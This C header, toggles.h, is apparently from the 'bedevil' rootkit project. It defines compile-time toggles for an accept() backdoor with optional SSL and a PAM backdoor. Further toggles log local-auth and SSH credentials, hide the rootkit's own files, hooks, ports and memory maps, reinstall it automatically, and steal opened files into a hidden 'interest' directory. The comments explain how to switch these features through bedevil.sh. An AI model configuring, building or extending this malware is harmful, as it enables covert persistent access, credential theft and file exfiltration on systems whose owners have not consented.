#ifndef TOGGLES_H
#define TOGGLES_H

/* you can manually define or undefine these following toggles, or allow
   bedevil.sh to make the changes for you.
   `./bedevil.sh -t` will allow you to switch these toggles without editing
   the file manually.

   if you want a toggle to be ignored by toggles.sh, just put '//ignore'
   at the end of the line.
       i.e.: '#define RANDOM_TOGGLE //ignore'
 */

#undef USE_ACCEPT_BD

/* requires PAM */
#undef USE_PAM_BD
#undef LOG_LOCAL_AUTH

/* all of the essential presence hiding toggles are ignored... */
#define HIDE_SELF //ignore
#define HIDE_HOOKS //ignore
#define FORGE_MAPS //ignore
#define HIDE_PORTS //ignore
#define DO_REINSTALL //ignore
#define BLOCK_STRINGS //ignore
#undef LOG_SSH

/* when this is defined, files opened by open and fopen
   are copied to INTEREST_DIR. this is defined in
   hooks/open/consts. (etc/defaults.sh makes the path itself)
   the files that are of interest to us are defined in
   hooks/open/char_arrays. */
#undef FILE_STEAL
/* when this is defined w/ FILE_STEAL, when an attempt to
   steal a file by copying it to its new path fails,
   attempt to make a new link in the interesting dir for
   it instead. i would personally discourage using this
   but it's here anyway... */
#undef LINK_IF_ERR //ignore

#define USE_CRYPT //ignore
/* requires SSL. SSL backdoor source port is $((( ACCEPT_PORT + 1 ))) */
#undef ACCEPT_USE_SSL
#define EXEC_PRE_SHELL //ignore

#endif